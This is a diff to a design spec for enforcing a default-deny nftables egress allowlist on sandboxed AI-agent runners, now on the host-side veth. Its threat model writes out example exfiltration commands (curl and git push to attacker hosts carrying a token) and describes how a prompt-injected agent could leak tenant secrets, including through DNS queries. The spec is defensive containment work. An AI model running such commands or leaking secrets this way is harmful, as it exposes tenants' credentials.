@@ -23,7 +23,7 @@
 > 2. **The in-engine allowlist wraps only the `http_request` tool** (`tool_bridge.zig:39` — "currently only http_request"); `bash`/`git`/`web_fetch`/`web_search` carry no policy (`tool_builders.zig`), so `bash: curl https://evil -d "$TOKEN"` or `git push https://ghp_x@github.com/attacker/x` exfiltrate freely.
 > 3. **The "least-privilege / short-lived tool secrets" compensating control is vaporware** — `secrets_resolve.zig:48` reads vault credentials verbatim (no minting, no Time-To-Live, no scoping); the lease carries the raw secret inline (`protocol_test.zig:239`: `secrets_map:{github:{token:"ghp_x"}}`). The $-cap bounds LLM *spend*, not a stolen `ghp_` token's non-$ blast radius (repo/org write, unrevocable by usezombie).
 >
-> **Indy decision (verbatim, Jun 10, 2026):** _"I want to go with 1"_ — option 1 = pull the **in-netns nftables IP-allowlist** slice forward for launch; defer the Layer-7 (L7) DNS-pinning proxy to untrusted-runner GA.
+> **Indy decision (verbatim, Jun 10, 2026):** _"I want to go with 1"_ — option 1 = pull the **host-side nftables IP-allowlist** slice forward for launch; defer the Layer-7 (L7) DNS-pinning proxy to untrusted-runner GA.
 >
 > **This spec ships in two slices:**
 > - **Launch Slice (ship now — this PR):** §1 own-netns (drop `--share-net`) + §2 in-netns **nftables IP-allowlist** (default-deny; allow only the resolved IPs of the **per-zombie `NetworkPolicy`** — TRIGGER.md `network.allow` + the 8 `REGISTRY_ALLOWLIST` baseline hosts + the inference endpoint) + §3 parent-owned (it is the existing lease-carried `NetworkPolicy`, not a new parse). Closes **arbitrary-host** exfil — the wide-open `curl $secret → anywhere` case, ~the entire practical attack surface. Rides M84_003's bwrap/lane work.
@@ -33,7 +33,7 @@
 
 ## Implementing agent — read these first
 
-1. `src/runner/engine/network.zig` — `PolicyMode` (`deny_all` / `registry_allowlist`) and `appendNetworkArgs`; today `registry_allowlist` emits `--share-net` and only `log.debug`s the allowlist (lines ~68-76). This surface changes from "share host netns + log" to "own netns + in-netns nftables IP-allowlist".
+1. `src/runner/engine/network.zig` — `PolicyMode` (`deny_all` / `registry_allowlist`) and `appendNetworkArgs`; today `registry_allowlist` emits `--share-net` and only `log.debug`s the allowlist (lines ~68-76). This surface changes from "share host netns + log" to "own netns + host-side nftables IP-allowlist".
 2. `src/runner/engine/runner_network_policy.zig` — `REGISTRY_ALLOWLIST` (the registry **baseline**, lines ~13-22), **already merged per-zombie with `config.network.allow`** (M2_001/M3_001). Its own header names the gap this workstream closes: *"logged for observability only — TCP-layer restriction is **Phase 2 (nftables)**."* This spec **is** that Phase 2 — it enforces the existing merged allowlist; it does not invent a new one.
 3. `src/runner/sandbox_args.zig` — `appendBwrap`; where `--unshare-all` / `--share-net` are decided. The child must keep an **unshared** net namespace on every sandboxed tier, with a veth pair as its only route to the nftables-filtered host hop.
 4. `src/lib/contract/execution_policy.zig` — `NetworkPolicy` is the **per-execution egress allowlist** ("invariant for its lifetime", deny-all default) **already carried to the runner per-lease**, sourced from the zombie's TRIGGER.md `x-usezombie.network.allow` (parsed at `src/zombied/zombie/yaml_frontmatter.zig`). **This is the allowlist to resolve → IPs and install in nftables — there is no new `allow_hosts` parse.**
@@ -44,9 +44,9 @@
 
 ## PR Intent & comprehension handshake
 
-- **PR title (eventual):** `feat(m84): runner egress allowlist (launch slice) — own-netns + in-netns nftables IP allowlist`
+- **PR title (eventual):** `feat(m84): runner egress allowlist (launch slice) — own-netns + host-side nftables IP allowlist`
 - **Intent (one sentence):** A prompt-injected sandboxed agent can `connect()` only to the IPs the zombie's `NetworkPolicy` resolves to (TRIGGER.md `network.allow` + the `REGISTRY_ALLOWLIST` baseline + the inference endpoint/gateway); every other destination — arbitrary exfil targets, raw IPs, link-local, the host LAN — is dropped by **nftables in the child's own network namespace**, not merely logged.
-- **Handshake (agent fills at PLAN, before EXECUTE):** restate intent; list `ASSUMPTIONS I'M MAKING:`. **Confirm the enforcement point** (own-netns + in-netns nftables IP-allowlist) and that the resolved IP set includes the configured inference endpoint(s)/gateway — a too-tight set silently breaks every lease (the agent cannot reach its Large Language Model (LLM)); a too-loose one re-opens exfil. **Confirm the IP-resolution moment** (parent resolves the lease's `NetworkPolicy` hostnames → IP set at lease setup; `NetworkPolicy` is session-fixed so the child never resolves or widens it).
+- **Handshake (agent fills at PLAN, before EXECUTE):** restate intent; list `ASSUMPTIONS I'M MAKING:`. **Confirm the enforcement point** (own-netns + host-side nftables IP-allowlist) and that the resolved IP set includes the configured inference endpoint(s)/gateway — a too-tight set silently breaks every lease (the agent cannot reach its Large Language Model (LLM)); a too-loose one re-opens exfil. **Confirm the IP-resolution moment** (parent resolves the lease's `NetworkPolicy` hostnames → IP set at lease setup; `NetworkPolicy` is session-fixed so the child never resolves or widens it).
 
 ---
 
@@ -75,11 +75,11 @@
 
 ## Overview
 
-**Goal (testable):** On a network-enabled sandboxed tier, the child runs in its **own** network namespace and can `connect()` only to the IPs the operator's allowlist resolves to (inference endpoint/gateway + registry seed + declared `allow_hosts`); a `connect()` to any other IP — `attacker.example`'s address, a raw arbitrary IP, link-local, the host LAN — is **dropped by nftables in the child's netns**, proven by a negative test, while a legitimate LLM call and an allowed-host tool call still succeed.
+**Goal (testable):** On a network-enabled sandboxed tier, the child runs in its **own** network namespace and can `connect()` only to the IPs the operator's allowlist resolves to (inference endpoint/gateway + registry seed + declared `allow_hosts`); a `connect()` to any other IP — `attacker.example`'s address, a raw arbitrary IP, link-local, the host LAN — is **dropped by host-side nftables on the veth** (host netns, root-owned — Invariant 6), proven by a negative test, while a legitimate LLM call and an allowed-host tool call still succeed.
 
 **Problem:** The only network-enabled tier (`registry_allowlist`) emits bubblewrap `--share-net` — the child **joins the host network namespace** — and the allowlist is **log-only** (`network.zig:68-76`, `runner_network_policy.zig:5-9`). So a sandboxed agent has **full host egress**. The agent legitimately holds the tenant's inference `api_key` and tool secrets (a GitHub PAT) in its address space, delivered inline on the lease (`protocol_test.zig:239`); a prompt injection (platform-ops agents read untrusted issue/PR text by design) exfiltrates them to any host via `bash`/`git`/`web_fetch` — none of which consult the in-engine policy (`tool_bridge.zig:39` wraps only `http_request`). M84_003's `environ_map` removed only the *daemon's* token; the *tenant's own* secrets are untouched. **The per-zombie allowlist already exists and rides the lease** — TRIGGER.md `network.allow` → `NetworkPolicy` (`execution_policy.zig`) → merged with `REGISTRY_ALLOWLIST` (M2_001/M3_001) — but it is **only logged, not enforced** (Phase 1: `--share-net` + `log.debug`). The plumbing is built; the kernel enforcement is the gap this workstream fills.
 
-**Solution summary (launch slice):** Stop sharing the host network namespace. The sandboxed child keeps an **unshared** net namespace connected to the host by one veth pair, and the parent installs **default-deny nftables rules in that netns** that permit egress only to the **IP set resolved at lease setup from the per-zombie `NetworkPolicy`** (TRIGGER.md `network.allow` ∪ `REGISTRY_ALLOWLIST` baseline ∪ inference endpoint — the set already merged per M2_001/M3_001 and carried on the lease). Everything else is dropped at the kernel. The zombie's declared `network.allow` — which the schema already calls *"a kernel-level egress rule, rejected at packet time"* — becomes that real kernel boundary instead of a log line. Legitimate inference and allowed-host tool traffic are unchanged; arbitrary exfil and lateral reach are removed. The L7 *name*-based proxy (for rotating-CDN allowlists on the untrusted tier) is **deferred to §5**.
+**Solution summary (launch slice):** Stop sharing the host network namespace. The sandboxed child keeps an **unshared** net namespace connected to the host by one veth pair, and the parent installs **default-deny nftables rules in the host netns, on the host-side veth** (root-owned, Invariant 6 — never inside the child's netns) that permit egress only to the **IP set resolved at lease setup from the per-zombie `NetworkPolicy`** (TRIGGER.md `network.allow` ∪ `REGISTRY_ALLOWLIST` baseline ∪ inference endpoint — the set already merged per M2_001/M3_001 and carried on the lease). Everything else is dropped at the kernel. The zombie's declared `network.allow` — which the schema already calls *"a kernel-level egress rule, rejected at packet time"* — becomes that real kernel boundary instead of a log line. Legitimate inference and allowed-host tool traffic are unchanged; arbitrary exfil and lateral reach are removed. The L7 *name*-based proxy (for rotating-CDN allowlists on the untrusted tier) is **deferred to §5**.
 
 **Prioritization.** This is the **#1 residual risk for the real deployment** after M84_003: on a baremetal outbound-only node there is no metadata endpoint and no co-located datastore to attack, so lateral movement is moot — the surviving threat is secret exfiltration over the wire, and the launch slice closes the arbitrary-host half of it cheaply.
 
@@ -97,7 +97,7 @@
 
 | File | Action | Why |
 |------|--------|-----|
-| `src/runner/engine/network.zig` | EDIT | `appendNetworkArgs`: never `--share-net`; keep the child's net namespace unshared; wire the veth + in-netns nftables IP-allowlist path. Remove the log-only allowlist emit. |
+| `src/runner/engine/network.zig` | EDIT | `appendNetworkArgs`: never `--share-net`; keep the child's net namespace unshared; wire the veth + host-side nftables IP-allowlist path. Remove the log-only allowlist emit. |
 | `src/runner/engine/runner_network_policy.zig` | EDIT | Promote `REGISTRY_ALLOWLIST` to the **enforced** seed; add the nftables table/chain + veth subnet constants (UFS). |
 | `src/runner/sandbox_args.zig` | EDIT | Ensure the child keeps an unshared net namespace on every sandboxed tier (no `--share-net` flag emitted). |
 | `src/lib/contract/execution_policy.zig` (`NetworkPolicy`) | READ (no new parse) | The per-zombie allowlist is **already carried** here (TRIGGER.md `network.allow`, merged per M2_001/M3_001). The new work **resolves** its hostnames → an IP set at lease setup and hands it to the nftables installer — no new `allow_hosts` parsing. |
@@ -109,8 +109,8 @@
 
 ## Decomposition & alternatives (patch vs refactor)
 
-- **Chosen shape (launch slice):** one atomic workstream (B1) — own-netns + in-netns nftables IP-allowlist + parent config/resolution plumbing share the network path; separate tests. It is a **refactor of the network tier** (the `--share-net` model is replaced), behaviour-preserving for the legitimate inference/allowed-host path.
-- **Mechanism (LOCKED — Indy, Jun 10, 2026): Phase-2 in-netns nftables enforcement of the existing `NetworkPolicy`.** The parent resolves the per-zombie allowlist (TRIGGER.md `network.allow` ∪ `REGISTRY_ALLOWLIST` ∪ inference endpoint — already merged per M2_001/M3_001 and carried on the lease) → an IPv4/IPv6 set at lease setup, and installs `nft` drop-all-except rules in the child's netns. This is exactly the *"Phase 2 (nftables)"* the `runner_network_policy.zig` header already names — the allowlist is built and carried; only the kernel enforcement is new. Rationale: the launch allowlist is small and largely static, so resolve-at-setup pins it for the lease with no L7 machinery and no per-lease process.
+- **Chosen shape (launch slice):** one atomic workstream (B1) — own-netns + host-side nftables IP-allowlist + parent config/resolution plumbing share the network path; separate tests. It is a **refactor of the network tier** (the `--share-net` model is replaced), behaviour-preserving for the legitimate inference/allowed-host path.
+- **Mechanism (LOCKED — Indy, Jun 10, 2026): Phase-2 host-side nftables enforcement of the existing `NetworkPolicy`.** The parent resolves the per-zombie allowlist (TRIGGER.md `network.allow` ∪ `REGISTRY_ALLOWLIST` ∪ inference endpoint — already merged per M2_001/M3_001 and carried on the lease) → an IPv4/IPv6 set at lease setup, and installs `nft` drop-all-except rules in the **host netns on the host-side veth** (root-owned — Invariant 6; never in the child's netns). This is exactly the *"Phase 2 (nftables)"* the `runner_network_policy.zig` header already names — the allowlist is built and carried; only the kernel enforcement is new. Rationale: the launch allowlist is small and largely static, so resolve-at-setup pins it for the lease with no L7 machinery and no per-lease process.
 - **Alternatives considered:**
   - **(a — DEFERRED to §5) L7 DNS-pinning forward proxy** — name-based SNI/`CONNECT` allowlisting; the correct layer for *names* on rotating CDNs and for forged-SNI / DNS-rebinding resistance. Heavier (a long-lived host proxy + SNI parsing + connect-IP pinning) and only required when the host set is large/rotating or operator-untrusted — i.e. the untrusted-runner tier. Deferred there.
   - **(b) Keep `--share-net`, add host-global firewall rules** — rejected: rules on a shared namespace mutate the *host's* networking and cannot be per-lease.
@@ -127,9 +127,9 @@ The child must never join the host network namespace. On a network-enabled tier 
 - **Dimension 1.1** — no sandboxed tier emits `--share-net`; the child's net namespace is unshared on `deny_all` AND the network-enabled tier → Test `test_no_share_net_on_any_sandboxed_tier`
 - **Dimension 1.2** — with no allowlist rules installed (setup failure), the child has **no** egress (fail-closed, not fall-open to the host network) → Test `test_egress_fails_closed_without_rules`
 
-### §2 — Default-deny in-netns nftables IP-allowlist (the allowlist enforced)
+### §2 — Default-deny host-side nftables IP-allowlist (the allowlist enforced)
 
-The child's netns carries an nftables ruleset that DROPs all egress except to the resolved allowlist IPs (name resolution is **parent-provided** per §3.3 — no forwarding resolver is reachable from the child). Loopback within the netns is allowed; the host LAN, link-local, and private ranges (except the veth subnet) are denied.
+The runner installs the nftables ruleset in the **host** network namespace, on the **host-side veth interface** (forward chain, `oifname "<veth-host>"`) — **NOT** inside the child's netns, which the child's user namespace owns and could `nft flush` (Invariant 6). Those host-side rules DROP all of the child's egress except to the resolved allowlist IPs (name resolution is **parent-provided** per §3.3 — no forwarding resolver is reachable from the child). The child's netns holds only its veth end + a default route to the host; the host LAN, link-local, and private ranges (except the veth subnet) are denied.
 
 - **Dimension 2.1** — a connect to an allowed IP (the resolved inference endpoint) succeeds → Test `test_allowed_ip_reachable`
 - **Dimension 2.2** — a connect to a non-allowed IP is dropped by nftables → Test `test_denied_ip_dropped` (+ `egress_denied` logged, IP only)
@@ -166,8 +166,9 @@ The allowlist caps the *blast radius*; it is not a complete exfil seal, and the 
 #   - allowlist = TRIGGER.md network.allow  ∪  REGISTRY_ALLOWLIST baseline  ∪  {inference endpoint/gateway}
 #                 (already merged per M2_001/M3_001 — NOT a new operator allow_hosts parse).
 #   - resolved at LEASE SETUP (parent) to an IP set; NetworkPolicy is session-fixed → child never widens it.
-# Child network namespace (own, not shared):
-#   veth pair -> host; in-netns nftables: default DROP egress, ACCEPT only resolved allowlist IPs.
+# Child network namespace (own, not shared):  veth-child <-> veth-host
+# Egress enforcement — in the HOST netns, on the HOST-SIDE veth (root-owned, Invariant 6; NOT the child netns):
+#   nft add rule inet filter forward oifname "<veth-host>" ... : default DROP, ACCEPT only resolved allowlist IPs.
 #   name resolution is PARENT-PROVIDED: static name->IP mappings injected into the netns, OR a
 #   non-forwarding stub that answers ONLY allowlisted names. NO forwarding resolver is reachable (§3.3).
 # Enforcement contract:
@@ -198,7 +199,7 @@ Contract: the legitimate path (inference endpoint + declared `allow_hosts`, rule
 ## Invariants
 
 1. **No host-netns sharing** — no sandboxed tier emits `--share-net`; the child's net namespace is always unshared. Enforced by `test_no_share_net_on_any_sandboxed_tier`.
-2. **Default-deny egress (nftables)** — a destination IP not in the resolved allowlist is dropped in the child's netns; the child's only route is the veth gated by nft, and **no forwarding DNS resolver is reachable** (§3.3) so secrets cannot tunnel in DNS query names. Enforced by `test_denied_ip_dropped` + `test_egress_fails_closed_without_rules` + `test_dns_tunnel_query_dropped`.
+2. **Default-deny egress (nftables)** — a destination IP not in the resolved allowlist is dropped by **host-side nft on the veth** (host netns, root-owned — Invariant 6); the child's only route is the veth, and **no forwarding DNS resolver is reachable** (§3.3) so secrets cannot tunnel in DNS query names. Enforced by `test_denied_ip_dropped` + `test_egress_fails_closed_without_rules` + `test_dns_tunnel_query_dropped`.
 3. **No datastore credential in the child** — the runner is built `base,sqlite` (`build_runner.zig`); the child holds no database connection string and opens no datastore socket; durable memory is the control plane's HTTPS responsibility. **Never build the runner with `-Dengines=postgres`.** Enforced by a build-config assertion + the absence of a DB host in the resolved allowlist.
 4. **Allowlist is parent-owned** — nothing in the child's environment or lease can widen the resolved nft set. Enforced by `test_allowlist_not_child_extendable`.
 5. **Legitimate path unchanged** — inference endpoint + declared `allow_hosts` (rules installed) produce an identical observable outcome; a golden-arg/integration test pins it.
